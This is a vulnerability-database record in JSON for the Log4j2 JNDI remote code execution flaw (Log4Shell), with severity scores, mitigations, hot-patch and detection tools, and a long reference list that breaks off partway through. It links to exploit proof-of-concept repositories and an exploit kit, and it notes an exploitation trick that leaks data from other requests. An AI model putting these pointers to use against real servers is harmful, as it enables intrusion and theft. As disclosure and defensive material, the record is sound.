{
  "gsd": {
    "id": "GSD-2021-1002352",
    "vendor_name": "Apache",
    "product_name": [
      "Log4j",
      "Log4j2"
    ],
    "product_version": "<=2.14.1",
    "vulnerability_type": "CWE-502 Deserialization of Untrusted Data, CWE-400 Uncontrolled Resource Consumption, CWE-20 Improper Input Validation",
    "affected_component": "unspecified",
    "attack_vector": "network",
    "impact": "remote code execution",
    "credit": "",
    "overlay_data": {
      "cve.org": {
        "data_format": "MITRE",
        "data_type": "CVE",
        "data_version": "4.0",
        "impact": {
          "cvss": {
            "attackVector": "NETWORK",
            "attackComplexity": "LOW",
            "privilegesRequired": "NONE",
            "userInteraction": "NONE",
            "scope": "CHANGED",
            "confidentialityImpact": "HIGH",
            "integrityImpact": "HIGH",
            "availabilityImpact": "HIGH",
            "baseScore": 10,
            "baseSeverity": "CRITICAL",
            "exploitCodeMaturity": "HIGH",
            "remediationLevel ": "OFFICIALFIX",
            "reportConfidence": "CONFIRMED",
            "temporalScore": 9.5,
            "temporalSeverity": "CRITICAL",
            "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C",
            "version": "3.1"
          }
        },
        "affects": {
          "vendor": {
            "vendor_data": [
              {
                "vendor_name": "Red Hat",
                "product": {
                  "product_data": [
                    {
                      "product_name": "OpenShift",
                      "version": {
                        "version_data": [
                          {
                            "version_affected": "=",
                            "version_name": "OpenShift Container Platform 4",
                            "version_value": "4"
                          }
                        ]
                      }
                    }
                  ]
                }
              }
            ]
          }
        },
        "description": {
          "description_data": [
            {
              "lang": "eng",
              "value": "This vulnerability was not correctly fixed \"in certain non-default configuration\" and a new vulnerability and patch have been released, please see GSD-2021-1002353 (CVE-2021-45046). Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. \n\n In log4j 2.15.1 and later JNDI will be disabled by default:\n\n \"Dealing with CVE-2021-44228 has shown the JNDI has significant security issues. While we have mitigated what we are aware of it would be safer for users to completely disable it by default, especially since the large majority are unlikely to be using it. Those who are will need to specify -Dlog4j2.enableJndi=true or the environment variable form of it to use any JNDI components.\" (https://issues.apache.org/jira/browse/LOG4J2-3208)\n\n In previous releases (>2.10) this behavior can be mitigated by setting system property \"log4j2.formatMsgNoLookups\" to \"true\" or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against remote code execution by defaulting \"com.sun.jndi.rmi.object.trustURLCodebase\" and \"com.sun.jndi.cosnaming.object.trustURLCodebase\" to \"false\".\n\n Later versions of the Oracle Java JDK are not affected by the LDAP attack vector, but other vectors are available for exploitation: \"JDK versions greater than 6u211, 7u201, 8u191, and 11.0.1 are not affected by the LDAP attack vector but please note this still leaves other attack vectors. In these versions com.sun.jndi.ldap.object.trustURLCodebase is set to \"false\" meaning JNDI cannot load remote code using LDAP.\" (https://www.lunasec.io/docs/blog/log4j-zero-day/)\n\n Also please note that log4j version 1.x is not affected by this specific vulnerability it does have a number of known serious security flaws and likely also contains Remote Code Execution vulnerabilities, upgrading it should be investigated.\n\nHot patches:\n\nThere are currently several projects providing hot patches that can modify a running system to remove the vulnerability and are OpenSource licensed allowing them to be easily audited:\n\nLog4jHotPatch\n\n\"This is a tool which injects a Java agent into a running JVM process. The agent will attempt to patch the lookup() method of all loaded org.apache.logging.log4j.core.lookup.JndiLookup instances to unconditionally return the string \"Patched JndiLookup::lookup()\". It is designed to address the CVE-2021-44228 remote code execution vulnerability in Log4j without restarting the Java process. The dynamic and static agents are known to run on JDK 8 & 11 on Linux whereas on JDK 17 only the static agent is working (see below)\" (https://github.com/corretto/hotpatch-for-apache-log4j2)\n\nLogout4Shell\n\n\"However, enabling these system property requires access to the vulnerable servers as well as a restart. The Cybereason research team has developed the following code that exploits the same vulnerability and the payload therein forces the logger to reconfigure itself with the vulnerable setting disabled - this effectively blocks any further attempt to exploit Log4Shell on this server.\" (https://github.com/Cybereason/Logout4Shell)\n\nDetection\n\nPlease see the GSD reference links tagged with \"DETECTION\" for more information (there are to many to list here).\n\nTOP LINKS:\n\n Best list of vulnerable software: https://github.com/NCSC-NL/log4shell/tree/main/software\n\n Best list of vulnerable services: https://github.com/YfryTchsGD/Log4jAttackSurface\n\n Best hotpatch:\n\n https://github.com/corretto/hotpatch-for-apache-log4j2\n\n Best detection:\n\n grep: https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b\n\n jarhashes: https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes\n\n semgrep: https://github.com/returntocorp/semgrep-rules/pull/1650/commits/ecfc32623eec718d61ec83b9196574f333191008/\n\n yara: https://github.com/timb-machine/log4j/\n\n burpsuite: https://github.com/silentsignal/burp-log4shell\n\n Nmap NSE: https://github.com/Diverto/nse-log4shell\n\n Scanners: \n https://github.com/alexbakker/log4shell-tools\n https://github.com/fullhunt/log4j-scan\n https://github.com/takito1812/log4j-detect\n\nExploitation:\n\nAn exploit kit is available at https://github.com/pimps/JNDI-Exploit-Kit and it has also been reported that omitting the closing } can result in data from other requests being sent as some servers with log4j2 will apparently keep sending data until they find a closing }."
            }
          ]
        }
      }
    },
    "references": [
      {
        "refsource": "EXPLOIT",
        "name": "https://twitter.com/stereotype32/status/1469313856229228544",
        "url": "https://twitter.com/stereotype32/status/1469313856229228544"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/",
        "url": "https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/"
      },
      {
        "refsource": "CONFIRM",
        "name": "Log4Shell: RCE 0-day exploit found in log4j2, a popular Java logging package",
        "url": "https://www.lunasec.io/docs/blog/log4j-zero-day/"
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://github.com/tangxiaofeng7/apache-log4j-poc",
        "url": "https://github.com/tangxiaofeng7/apache-log4j-poc"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://news.ycombinator.com/item?id=29504755",
        "url": "https://news.ycombinator.com/item?id=29504755"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://twitter.com/P0rZ9/status/1468949890571337731",
        "url": "https://twitter.com/P0rZ9/status/1468949890571337731"
      },
      {
        "refsource": "FIX",
        "name": "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.15.0/",
        "url": "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.15.0/"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/",
        "url": "https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://www.cisa.gov/uscert/ncas/current-activity/2021/12/10/apache-releases-log4j-version-2150-address-critical-rce",
        "url": "https://www.cisa.gov/uscert/ncas/current-activity/2021/12/10/apache-releases-log4j-version-2150-address-critical-rce"
      },
      {
        "refsource": "CONFIRM",
        "name": "http://mail-archives.us.apache.org/mod_mbox/www-announce/202112.mbox/%3C643bc702-4b46-411b-4980-1fcf637dbb11%40apache.org%3E",
        "url": "http://mail-archives.us.apache.org/mod_mbox/www-announce/202112.mbox/%3C643bc702-4b46-411b-4980-1fcf637dbb11%40apache.org%3E"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-549032-10F2.html",
        "url": "https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-549032-10F2.html"
      },
      {
        "refsource": "HOTPATCH",
        "name": "https://github.com/simonis/Log4jPatch",
        "url": "https://github.com/simonis/Log4jPatch",
        "content": "Further development of this tool will continue at corretto/hotpatch-for-apache-log4j2."
      },
      {
        "refsource": "HOTPATCH",
        "name": "Log4jHotPatch",
        "url": "https://github.com/corretto/hotpatch-for-apache-log4j2",
        "content": "This is a tool which injects a Java agent into a running JVM process. The agent will attempt to patch the lookup() method of all loaded org.apache.logging.log4j.core.lookup.JndiLookup instances to unconditionally return the string \"Patched JndiLookup::lookup()\". It is designed to address the CVE-2021-44228 remote code execution vulnerability in Log4j without restarting the Java process."
      },
      {
        "refsource": "CONFIRMATION",
        "name": "Hotpatch for Apache Log4j",
        "url": "https://aws.amazon.com/blogs/opensource/hotpatch-for-apache-log4j/",
        "content": "We recommend that those running affected applications upgrade Log4j to version 2.15 to address this vulnerability. However, this isn\u2019t always quick, so folks from the Coretto team spent some time building a tool to hotpatch vulnerable log4j deployments. This tool is designed to hotpatch a running JVM using any Log4j 2.0+. The tool is idempotent, meaning that you can run this multiple times on the same JVM without changing the result past the initial application. This tool also looks for all the running JVMs and attempts to mitigate the vulnerability. You can also use this to patch shaded jars that include log4j as a dependency, and to patch multiple log4j instances on the classpath."
      },
      {
        "refsource": "AFFECTEDPRODUCTS",
        "name": "https://github.com/YfryTchsGD/Log4jAttackSurface",
        "url": "https://github.com/YfryTchsGD/Log4jAttackSurface"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://twitter.com/halvarflake/status/1469318326929272835",
        "url": "https://twitter.com/halvarflake/status/1469318326929272835"
      },
      {
        "refsource": "DETECTION",
        "name": "https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b",
        "url": "https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://twitter.com/_JohnHammond/status/1469255402290401285",
        "url": "https://twitter.com/_JohnHammond/status/1469255402290401285"
      },
      {
        "refsource": "DOCUMENTATION",
        "name": "https://logging.apache.org/log4j/2.x/manual/lookups.html",
        "url": "https://logging.apache.org/log4j/2.x/manual/lookups.html"
      },
      {
        "refsource": "DOCUMENTATION",
        "name": "https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf",
        "url": "https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"
      },
      {
        "refsource": "DOCUMENTATION",
        "name": "A JOURNEY FROM JNDI/LDAP MANIPULATION TO REMOTE CODE EXECUTION DREAM LAND",
        "url": "https://www.blackhat.com/us-16/briefings/schedule/#a-journey-from-jndildap-manipulation-to-remote-code-execution-dream-land-3345",
        "content": "JNDI (Java Naming and Directory Interface) is a Java API that allows clients to discover and look up data and objects via a name. These objects can be stored in different naming or directory services such as RMI, CORBA, LDAP, or DNS.\n\nThis talk will present a new type of vulnerability named \"JNDI Reference Injection\" found on malware samples attacking Java Applets (CVE-2015-4902). The same principles can be applied to attack web applications running JNDI lookups on names controlled by attackers. As we will demo during the talk, attackers will be able to use different techniques to run arbitrary code on the server performing JNDI lookups.\n\nThe talk will first present the basics of this new vulnerability including the underlying technology, and will then explain in depth the different ways an attacker can exploit it using different vectors and services. We will focus on exploiting RMI, LDAP and CORBA services as these are present in almost every Enterprise application.\n\nLDAP offers an alternative attack vector where attackers not able to influence the address of an LDAP lookup operation may still be able to modify the LDAP directory in order to store objects that will execute arbitrary code upon retrieval by the application lookup operation. This may be exploited through LDAP manipulation or simply by modifying LDAP entries as some Enterprise directories allow.",
        "timestamp": "2016-08-03",
        "tags": [
          "timeline"
        ]
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://twitter.com/aksquaretech/status/1469297067948347394",
        "url": "https://twitter.com/aksquaretech/status/1469297067948347394"
      },
      {
        "refsource": "WORKAROUND",
        "name": "https://rules.emergingthreatspro.com/open/",
        "url": "https://rules.emergingthreatspro.com/open/"
      },
      {
        "refsource": "FIX",
        "name": "RHSB-2021-009 Log4Shell - Remote Code Execution - log4j",
        "url": "https://access.redhat.com/security/vulnerabilities/RHSB-2021-009"
      },
      {
        "refsource": "FIX",
        "name": "https://www.suse.com/security/cve/CVE-2021-44228.html",
        "url": "https://www.suse.com/security/cve/CVE-2021-44228.html"
      },
      {
        "refsource": "FIX",
        "name": "https://security-tracker.debian.org/tracker/CVE-2021-44228",
        "url": "https://security-tracker.debian.org/tracker/CVE-2021-44228"
      },
      {
        "refsource": "FIX",
        "name": "https://ubuntu.com/security/CVE-2021-44228",
        "url": "https://ubuntu.com/security/CVE-2021-44228"
      },
      {
        "refsource": "CONFIRM",
        "name": "Log4j RCE: Emergency patch issued to plug critical auth-free code execution hole in widely-used logging utility",
        "url": "https://www.theregister.com/2021/12/10/log4j_remote_code_execution_vuln_patch_issued/"
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce",
        "url": "https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce"
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://twitter.com/chvancooten/status/1469340927923826691",
        "url": "https://twitter.com/chvancooten/status/1469340927923826691"
      },
      {
        "refsource": "FIX",
        "name": "VMSA-2021-0028",
        "url": "https://www.vmware.com/security/advisories/VMSA-2021-0028.html"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://www.cnblogs.com/yyhuni/p/15088134.html",
        "url": "https://www.cnblogs.com/yyhuni/p/15088134.html"
      },
      {
        "refsource": "CONFIRM",
        "name": "CVE-2021-44228 \u2013 Log4j 2 Vulnerability Analysis",
        "url": "https://www.randori.com/blog/cve-2021-44228/"
      },
      {
        "refsource": "DETECTION",
        "name": "CVE-2021-44228-Log4Shell-Hashes",
        "url": "https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes"
      },
      {
        "refsource": "DETECTION",
        "name": "Using Anchore Enterprise to Detect and Prevent Log4Shell, the Log4j Zero-Day Vulnerability",
        "url": "https://anchore.com/blog/using-anchore-enterprise-to-detect-prevent-log4j-zero-day/"
      },
      {
        "refsource": "CONFIRM",
        "name": "How to detect the Log4j vulnerability in your applications",
        "url": "https://www.infoworld.com/article/3644492/how-to-detect-the-log4j-vulnerability-in-your-applications.html"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://developers.slashdot.org/story/21/12/10/2131259/new-zero-day-in-the-log4j-java-library-is-already-being-exploited",
        "url": "https://developers.slashdot.org/story/21/12/10/2131259/new-zero-day-in-the-log4j-java-library-is-already-being-exploited"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://www.zdnet.com/article/security-warning-new-zero-day-in-the-log4j-java-library-is-already-being-exploited/",
        "url": "https://www.zdnet.com/article/security-warning-new-zero-day-in-the-log4j-java-library-is-already-being-exploited/"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://blog.cloudflare.com/how-cloudflare-security-responded-to-log4j2-vulnerability/",
        "url": "https://blog.cloudflare.com/how-cloudflare-security-responded-to-log4j2-vulnerability/"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/",
        "url": "https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/",
        "url": "https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://www.wired.com/story/log4j-flaw-hacking-internet/",
        "url": "https://www.wired.com/story/log4j-flaw-hacking-internet/"
      },
      {
        "refsource": "DETECTION",
        "name": "https://github.com/returntocorp/semgrep-rules/pull/1650/commits/ecfc32623eec718d61ec83b9196574f333191008/",
        "url": "https://github.com/returntocorp/semgrep-rules/pull/1650/commits/ecfc32623eec718d61ec83b9196574f333191008"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
        "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.cisa.gov/news/2021/12/11/statement-cisa-director-easterly-log4j-vulnerability",
        "url": "https://www.cisa.gov/news/2021/12/11/statement-cisa-director-easterly-log4j-vulnerability"
      },
      {
        "refsource": "WORKAROUND",
        "name": "https://cloud.google.com/blog/products/identity-security/cloud-armor-waf-rule-to-help-address-apache-log4j-vulnerability",
        "url": "https://cloud.google.com/blog/products/identity-security/cloud-armor-waf-rule-to-help-address-apache-log4j-vulnerability"
      },
      {
        "refsource": "WORKAROUND",
        "name": "https://www.reddit.com/r/netsec/comments/re468q/log4shell_using_the_vulnerability_to_patch_the/",
        "url": "https://www.reddit.com/r/netsec/comments/re468q/log4shell_using_the_vulnerability_to_patch_the/"
      },
      {
        "refsource": "WORKAROUND",
        "name": "Logout4Shell",
        "url": "https://github.com/Cybereason/Logout4Shell"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/log4shell-vulnerability-is-the-coal-in-our-stocking-for-2021/",
        "url": "https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/log4shell-vulnerability-is-the-coal-in-our-stocking-for-2021/"
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://github.com/christophetd/log4shell-vulnerable-app",
        "url": "https://github.com/christophetd/log4shell-vulnerable-app"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://www.greynoise.io/viz/query/?gnql=tags%3A%22Apache%20Log4j%20RCE%20Attempt%22",
        "url": "https://www.greynoise.io/viz/query/?gnql=tags%3A%22Apache%20Log4j%20RCE%20Attempt%22"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/log4shell-vulnerability-is-the-coal-in-our-stocking-for-2021/",
        "url": "https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/log4shell-vulnerability-is-the-coal-in-our-stocking-for-2021/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://twitter.com/canrevagency/status/1469487239671468033",
        "url": "https://twitter.com/canrevagency/status/1469487239671468033"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://twitter.com/sans_isc/status/1469653801581875208",
        "url": "https://twitter.com/sans_isc/status/1469653801581875208"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://twitter.com/rayhan0x01",
        "url": "https://twitter.com/rayhan0x01"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592",
        "url": "https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://twitter.com/lukolejnik/status/1469327074271899652",
        "url": "https://twitter.com/lukolejnik/status/1469327074271899652"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://twitter.com/cyb3rops/status/1469405846010572816",
        "url": "https://twitter.com/cyb3rops/status/1469405846010572816"
      },
      {
        "refsource": "VENDOR",
        "name": "Akamai",
        "url": "https://www.akamai.com/blog/news/CVE-2021-44228-Zero-Day-Vulnerability"
      },
      {
        "refsource": "VENDOR",
        "name": "Apache Druid",
        "url": "https://github.com/apache/druid/pull/12051"
      },
      {
        "refsource": "VENDOR",
        "name": "Apache Flink",
        "url": "https://flink.apache.org/2021/12/10/log4j-cve.html"
      },
      {
        "refsource": "VENDOR",
        "name": "Apache LOG4J",
        "url": "https://logging.apache.org/log4j/2.x/security.html"
      },
      {
        "refsource": "VENDOR",
        "name": "Apache Kafka",
        "url": "https://lists.apache.org/thread/lgbtvvmy68p0059yoyn9qxzosdmx4jdv"
      },
      {
        "refsource": "VENDOR",
        "name": "Apache Solr",
        "url": "https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228"
      },
      {
        "refsource": "VENDOR",
        "name": "Apero CAS",
        "url": "https://apereo.github.io/2021/12/11/log4j-vuln/"
      },
      {
        "refsource": "VENDOR",
        "name": "Aptible",
        "url": "https://status.aptible.com/incidents/gk1rh440h36s?u=zfbcrbt2lkv4"
      },
      {
        "refsource": "VENDOR",
        "name": "Atlassian",
        "url": "https://confluence.atlassian.com/kb/faq-for-cve-2021-44228-1103069406.html"
      },
      {
        "refsource": "VENDOR",
        "name": "Automox",
        "url": "https://blog.automox.com/log4j-critical-vulnerability-scores-a-10"
      },
      {
        "refsource": "VENDOR",
        "name": "AWS",
        "url": "https://aws.amazon.com/security/security-bulletins/AWS-2021-005/"
      },
      {
        "refsource": "VENDOR",
        "name": "AZURE Datalake store java",
        "url": "https://github.com/Azure/azure-data-lake-store-java/blob/ed5d6304783286c3cfff0a1dee457a922e23ad48/CHANGES.md#version-2310"
      },
      {
        "refsource": "VENDOR",
        "name": "BACKBLAZE",
        "url": "https://twitter.com/backblaze/status/1469477224277368838"
      },
      {
        "refsource": "VENDOR",
        "name": "BitNami By VMware",
        "url": "https://docs.bitnami.com/general/security/security-2021-12-10/"
      },
      {
        "refsource": "VENDOR",
        "name": "Broadcom",
        "url": "https://support.broadcom.com/security-advisory/content/security-advisories/Symantec-Security-Advisory-for-Log4j-2-CVE-2021-44228-Vulnerability/SYMSA19793"
      },
      {
        "refsource": "VENDOR",
        "name": "CarbonBlack",
        "url": "https://community.carbonblack.com/t5/Threat-Research-Docs/Log4Shell-Log4j-Remote-Code-Execution-CVE-2021-44228/ta-p/109134"
      },
      {
        "refsource": "VENDOR",
        "name": "Cerberus FTP",
        "url": "https://support.cerberusftp.com/hc/en-us/articles/4412448183571-Cerberus-is-not-affected-by-CVE-2021-44228-log4j-0-day-vulnerability"
      },
      {
        "refsource": "VENDOR",
        "name": "CheckPoint",
        "url": "https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk176865&partition=General&product=IPS"
      },
      {
        "refsource": "VENDOR",
        "name": "Cisco: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd",
        "url": ""
      },
      {
        "refsource": "VENDOR",
        "name": "Citrix",
        "url": "https://support.citrix.com/article/CTX335705"
      },
      {
        "refsource": "VENDOR",
        "name": "CloudFlare",
        "url": "https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/"
      },
      {
        "refsource": "VENDOR",
        "name": "CPanel",
        "url": "https://forums.cpanel.net/threads/log4j-cve-2021-44228-does-it-affect-cpanel.696249/"
      },
      {
        "refsource": "VENDOR",
        "name": "CommVault https://community.commvault.com/technical-q-a-2/log4j-been-used-in-commvault-1985?postid=11745#post11745",
        "url": ""
      },
      {
        "refsource": "VENDOR",
        "name": "Connect2id",
        "url": "https://connect2id.com/blog/connect2id-server-12-5-1"
      },
      {
        "refsource": "VENDOR",
        "name": "ConnectWise",
        "url": "https://www.connectwise.com/company/trust/advisories"
      },
      {
        "refsource": "VENDOR",
        "name": "ContrastSecurity",
        "url": "https://support.contrastsecurity.com/hc/en-us/articles/4412612486548"
      },
      {
        "refsource": "VENDOR",
        "name": "Coralogix",
        "url": "https://twitter.com/Coralogix/status/1469713430659559425"
      },
      {
        "refsource": "VENDOR",
        "name": "CouchBase",
        "url": "https://forums.couchbase.com/t/ann-elasticsearch-connector-4-3-3-4-2-13-fixes-log4j-vulnerability/32402"
      },
      {
        "refsource": "VENDOR",
        "name": "Cybereason",
        "url": "https://www.cybereason.com/blog/cybereason-solutions-are-not-impacted-by-apache-log4j-vulnerability-cve-2021-44228"
      },
      {
        "refsource": "VENDOR",
        "name": "Datto",
        "url": "https://www.datto.com/blog/dattos-response-to-log4shell"
      },
      {
        "refsource": "VENDOR",
        "name": "Debian",
        "url": "https://security-tracker.debian.org/tracker/CVE-2021-44228"
      },
      {
        "refsource": "VENDOR",
        "name": "Dell",
        "url": "https://www.dell.com/support/kbdoc/fr-fr/000194372/dsn-2021-007-dell-response-to-apache-log4j-remote-code-execution-vulnerability"
      },
      {
        "refsource": "VENDOR",
        "name": "Docker",
        "url": "https://www.docker.com/blog/apache-log4j-2-cve-2021-44228/"
      },
      {
        "refsource": "VENDOR",
        "name": "DropWizard",
        "url": "https://twitter.com/dropwizardio/status/1469285337524580359"
      },
      {
        "refsource": "VENDOR",
        "name": "DynaTrace",
        "url": "https://community.dynatrace.com/t5/Dynatrace-Open-Q-A/Impact-of-log4j-zero-day-vulnerability/m-p/177259/highlight/true#M19282"
      },
      {
        "refsource": "VENDOR",
        "name": "Eclipse Foundation",
        "url": "https://git.eclipse.org/r/c/tracecompass/org.eclipse.tracecompass/+/188751"
      },
      {
        "refsource": "VENDOR",
        "name": "Elastic",
        "url": "https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476"
      },
      {
        "refsource": "VENDOR",
        "name": "EVLLABS JGAAP",
        "url": "https://github.com/evllabs/JGAAP/releases/tag/v8.0.2"
      },
      {
        "refsource": "VENDOR",
        "name": "F5 Networks",
        "url": "https://support.f5.com/csp/article/K19026212"
      },
      {
        "refsource": "VENDOR",
        "name": "F-Secure https://status.f-secure.com/incidents/sk8vmr0h34pd",
        "url": ""
      },
      {
        "refsource": "VENDOR",
        "name": "Forescout",
        "url": "https://forescout.force.com/support/s/article/Important-security-information-related-to-Apache-Log4j-utility-CVE-2021-44228"
      },
      {
        "refsource": "VENDOR",
        "name": "FusionAuth",
        "url": "https://fusionauth.io/blog/2021/12/10/log4j-fusionauth/"
      },
      {
        "refsource": "VENDOR",
        "name": "Ghidra",
        "url": "https://github.com/NationalSecurityAgency/ghidra/blob/2c73c72f0ba2720c6627be4005a721a5ebd64b46/README.md#warning"
      },
      {
        "refsource": "VENDOR",
        "name": "GitHub",
        "url": "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q"
      },
      {
        "refsource": "VENDOR",
        "name": "GoAnywhere",
        "url": "https://www.goanywhere.com/cve-2021-44228-goanywhere-mitigation-steps"
      },
      {
        "refsource": "VENDOR",
        "name": "Google Cloud Armor WAF",
        "url": "https://cloud.google.com/blog/products/identity-security/cloud-armor-waf-rule-to-help-address-apache-log4j-vulnerability"
      },
      {
        "refsource": "VENDOR",
        "name": "GrayLog",
        "url": "https://www.graylog.org/post/graylog-update-for-log4j"
      },
      {
        "refsource": "VENDOR",
        "name": "GuardedBox",
        "url": "https://twitter.com/GuardedBox/status/1469739834117799939"
      },
      {
        "refsource": "VENDOR",
        "name": "HackerOne",
        "url": "https://twitter.com/jobertabma/status/1469490881854013444"
      },
      {
        "refsource": "VENDOR",
        "name": "Huawei",
        "url": "https://www.huawei.com/en/psirt/security-notices/huawei-sn-20211210-01-log4j2-en"
      },
      {
        "refsource": "VENDOR",
        "name": "HostiFi",
        "url": "https://twitter.com/hostifi_net/status/1469511114824339464"
      },
      {
        "refsource": "VENDOR",
        "name": "Informatica",
        "url": "https://network.informatica.com/community/informatica-network/blog/2021/12/10/log4j-vulnerability-update"
      },
      {
        "refsource": "VENDOR",
        "name": "Ivanti",
        "url": "https://forums.ivanti.com/s/article/CVE-2021-44228-Java-logging-library-log4j-Ivanti-Products-Impact-Mapping?language=en_US"
      },
      {
        "refsource": "VENDOR",
        "name": "Imperva",
        "url": "https://www.imperva.com/blog/how-were-protecting-customers-staying-ahead-of-cve-2021-44228/"
      },
      {
        "refsource": "VENDOR",
        "name": "JAMF NATION",
        "url": "https://community.jamf.com/t5/jamf-pro/third-party-security-issue/td-p/253740"
      },
      {
        "refsource": "VENDOR",
        "name": "JazzSM DASH IBM",
        "url": "https://www.ibm.com/support/pages/node/6525552"
      },
      {
        "refsource": "VENDOR",
        "name": "Jenkins",
        "url": "https://www.jenkins.io/blog/2021/12/10/log4j2-rce-CVE-2021-44228/"
      },
      {
        "refsource": "VENDOR",
        "name": "JFROG",
        "url": "https://twitter.com/jfrog/status/1469385793823199240"
      },
      {
        "refsource": "VENDOR",
        "name": "Jitsi",
        "url": "https://github.com/jitsi/security-advisories/blob/4e1ab58585a8a0593efccce77d5d0e22c5338605/advisories/JSA-2021-0004.md"
      },
      {
        "refsource": "VENDOR",
        "name": "Keycloak",
        "url": "https://github.com/keycloak/keycloak/discussions/9078"
      },
      {
        "refsource": "VENDOR",
        "name": "Kafka Connect CosmosDB",
        "url": "https://github.com/microsoft/kafka-connect-cosmosdb/blob/0f5d0c9dbf2812400bb480d1ff0672dfa6bb56f0/CHANGELOG.md"
      },
      {
        "refsource": "VENDOR",
        "name": "LucentSKY",
        "url": "https://twitter.com/LucentSky/status/1469358706311974914"
      },
      {
        "refsource": "VENDOR",
        "name": "Lightbend",
        "url": "https://discuss.lightbend.com/t/regarding-the-log4j2-vulnerability-cve-2021-44228/9275"
      },
      {
        "refsource": "VENDOR",
        "name": "Macchina io",
        "url": "https://twitter.com/macchina_io/status/1469611606569099269"
      },
      {
        "refsource": "VENDOR",
        "name": "McAfee",
        "url": "https://kc.mcafee.com/corporate/index?page=content&id=KB95091"
      },
      {
        "refsource": "VENDOR",
        "name": "Metabase",
        "url": "https://github.com/metabase/metabase/commit/8bfce98beb25e48830ac2bfd57432301c5e3ab37"
      },
      {
        "refsource": "VENDOR",
        "name": "Minecraft",
        "url": "https://www.minecraft.net/en-us/article/important-message--security-vulnerability-java-edition"
      },
      {
        "refsource": "VENDOR",
        "name": "N-able",
        "url": "https://www.n-able.com/security-and-privacy/apache-log4j-vulnerability"
      },
      {
        "refsource": "VENDOR",
        "name": "NELSON",
        "url": "https://github.com/getnelson/nelson/blob/f4d3dd1f1d4f8dfef02487f67aefb9c60ab48bf5/project/custom.scala"
      },
      {
        "refsource": "VENDOR",
